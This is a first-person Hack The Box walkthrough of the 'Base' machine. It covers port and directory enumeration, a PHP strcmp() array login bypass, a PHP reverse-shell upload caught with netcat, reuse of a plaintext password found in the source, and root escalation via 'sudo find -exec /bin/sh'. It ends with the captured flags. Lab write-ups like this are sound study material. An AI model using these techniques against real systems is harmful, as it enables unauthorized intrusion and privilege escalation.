
# Base

## Machine Information

| Property   | Value              |
| ---------- | ------------------ |
| Platform   | Hack The Box       |
| Machine    | Base               |
| Difficulty | Very Easy          |
| IP Address | `10.129.95.184`    |
| OS         | Ubuntu Linux       |
| Open Ports | `22/tcp`, `80/tcp` |

---

# 1. Initial Enumeration

The machine was assigned the IP address:

```text
10.129.95.184
```

I started with a quick full-port Nmap scan. While the scan was running, I opened Firefox and accessed the target IP through the browser to begin enumerating the web application in parallel.

```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn -sV 10.129.95.184 -oG Allports
```

### Nmap options

* `-p-` — Scans all 65,535 TCP ports.
* `--open` — Only displays ports that are identified as open.
* `-sS` — Performs a TCP SYN scan. It does not complete the normal TCP three-way handshake for each port, making it a commonly used and relatively fast scanning technique.
* `--min-rate 5000` — Sets a minimum packet transmission rate of 5,000 packets per second, allowing for a very fast scan.
* `-vvv` — Enables triple verbosity, providing detailed information about the scan as it progresses.
* `-n` — Disables DNS resolution, avoiding the additional time required for reverse DNS lookups.
* `-Pn` — Skips host discovery and treats the target as online. This is useful when I already know the host is active.
* `10.129.95.184` — Target IP address.
* `-oG Allports` — Saves the output in Nmap's greppable format to a file called `Allports`.

The scan identified two open ports:

```text
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

The two interesting services were therefore:

* `22/tcp` — SSH
* `80/tcp` — HTTP

---

# 2. Service Enumeration

After identifying the open ports, I performed a more detailed scan against them using Nmap's default scripts and version detection:

```bash
nmap -sCV -p22,80 10.129.95.184
```

The result was:

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 f6:5c:9b:38:ec:a7:5c:79:1c:1f:18:1c:52:46:f7:0b (RSA)
|   256 65:0c:f7:db:42:03:46:07:f2:12:89:fe:11:20:2c:53 (ECDSA)
|_  256 b8:65:cd:3f:34:d8:02:6a:e3:18:23:3e:77:dd:87:40 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Welcome to Base
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

There was not much additional information from the service enumeration, so I focused on the web application running on port `80`.

---

# 3. Web Enumeration

I began by manually exploring the website through Firefox.

One of the first things I tested was whether the application was vulnerable to Local File Inclusion (LFI). I tried requesting:

```text
../../../../../../etc/passwd
```

However, this did not produce useful results, so I continued enumerating the application.

During the manual enumeration, I found a login page:

```text
/login/login.php
```

Interestingly, if I removed `login.php` from the URL and accessed the `/login/` directory directly, the server exposed a **directory listing**.

This revealed several files and paths that were not directly visible from the main page.

One particularly interesting file was a Vim swap file:

```text
login.php.swp
```

I downloaded the `.swp` file and inspected its contents.

---

# 4. Authentication Bypass — PHP `strcmp()`

The recovered source code revealed that the login functionality used PHP's `strcmp()` function to compare the supplied username and password.

The relevant behavior made the authentication mechanism vulnerable to an input-type manipulation involving PHP arrays.

Instead of supplying normal string parameters, I could send them as arrays:

```text
username[]=root&password[]=admin
```

This could be tested through Burp Suite.

The underlying issue is related to the way PHP handles an array when it is passed to a function expecting strings. This causes `strcmp()` to behave unexpectedly and can result in an authentication bypass.

Reference:

[PHP strcmp() Authentication Bypass — Doyler](https://www.doyler.net/security-not-included/bypassing-php-strcmp-abctf2016?utm_source=chatgpt.com)

Although this provided one possible way into the application, I continued enumerating the web server to look for a simpler route.

---

# 5. Directory Enumeration

I used Gobuster to enumerate directories and files:

```bash
gobuster dir -u 10.129.95.184/ \
-w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt \
-t 100 \
-x .php
```

This revealed two particularly interesting paths:

```text
/_uploaded
/upload.php
```

The `/upload.php` endpoint appeared to provide a file-upload functionality.

The `/uploaded` directory was especially interesting because it appeared to be the location where uploaded files were stored.

This suggested that instead of exploiting the `strcmp()` vulnerability through Burp Suite, I could potentially obtain direct code execution through the file-upload functionality.

---

# 6. Initial Access

I accessed:

```text
http://10.129.95.184/upload.php
```

The page contained a file-upload functionality.

I prepared a PHP reverse shell and uploaded it through the application.

I then started a Netcat listener on my attacking machine:

```bash
nc -nlvp 4444
```

After uploading the PHP shell, I accessed the corresponding file through:

```text
/_uploaded/
```

and executed it.

The reverse shell successfully connected back to my machine.

I obtained a shell as:

```text
www-data
```

At this point, I had achieved initial access to the target system.

---

# 7. Local Enumeration

With a shell as `www-data`, I started enumerating the system for possible users and paths to privilege escalation.

I first inspected `/home`:

```bash
ls /home
```

This revealed a user named:

```text
john
```

I attempted to access John's home directory, but `www-data` did not have sufficient permissions to read or modify his files.

Since the web application was running under `/var/www/html`, I returned to the web root and searched through the PHP source code for potentially exposed credentials.

I used:

```bash
grep -rniI --include='*.php' 'password' /var/www/html
```

The search revealed credentials associated with the user `john`:

```text
thisisagoodpassword
```

This was an important finding because it provided a potential path from the low-privileged web account to the local user account.

---

# 8. User Access

I attempted to switch to the `john` user:

```bash
su john
```

Using the password found in the PHP source code:

```text
thisisagoodpassword
```

the authentication was successful.

I now had access as:

```text
john
```

The next objective was privilege escalation to `root`.

---

# 9. Privilege Escalation

The first thing I checked was whether the current user had any special `sudo` permissions:

```bash
sudo -l
```

The output showed that `john` had permission to execute the `find` binary with elevated privileges.

This was interesting because `find` can execute arbitrary commands through its `-exec` option.

I checked GTFOBins for a known privilege-escalation technique involving `find`.

Reference:

[GTFOBins — find](https://gtfobins.org/gtfobins/find/?utm_source=chatgpt.com#shell)

The relevant command was:

```bash
sudo find . -exec /bin/sh \; -quit
```

Because `find` was allowed to execute with `sudo`, `/bin/sh` was spawned with root privileges.

The command successfully provided a shell as:

```text
root
```

At this point, full system compromise had been achieved.

---

# 10. Flags

Once I obtained a root shell, I was able to read both flags.

## User Flag

```text
f54846c258f3b4612f78a819573d158e
```

## Root Flag

```text
51709519ea18ab37dd6fc58096bea949
```

---

# 11. Attack Path Summary

The complete attack chain was:

```text
Nmap
  
22/tcp — SSH
80/tcp — HTTP
  
Web enumeration
  
/login/login.php
  
Directory listing
  
login.php.swp
  
strcmp() authentication bypass identified
  
Further Gobuster enumeration
  
/upload.php
  
Unrestricted / exploitable file upload
  
PHP reverse shell
  
www-data
  
/var/www/html PHP source enumeration
  
John's password discovered
  
su john
  
sudo -l
  
find allowed with sudo
  
find -exec /bin/sh
  
root
```

---

# 12. Lessons Learned

This machine reinforced several techniques:

* Full TCP port enumeration with Nmap.
* Service and version enumeration.
* Manual web application enumeration.
* Directory listing discovery.
* Identifying sensitive information inside `.swp` files.
* Understanding PHP's `strcmp()` behavior with unexpected input types.
* Authentication bypass through PHP array parameters.
* Directory and file enumeration with Gobuster.
* Identifying potentially dangerous file-upload functionality.
* Obtaining initial access through a PHP reverse shell.
* Searching application source code for exposed credentials.
* Local user enumeration.
* Checking `sudo` permissions with `sudo -l`.
* Using GTFOBins to identify privilege-escalation techniques.
* Exploiting `find -exec` when `find` is available through `sudo`.

The most important takeaway from the machine was not simply the individual exploits, but the enumeration process: each discovery provided information that led to the next step instead of relying on a single exploit from the beginning.
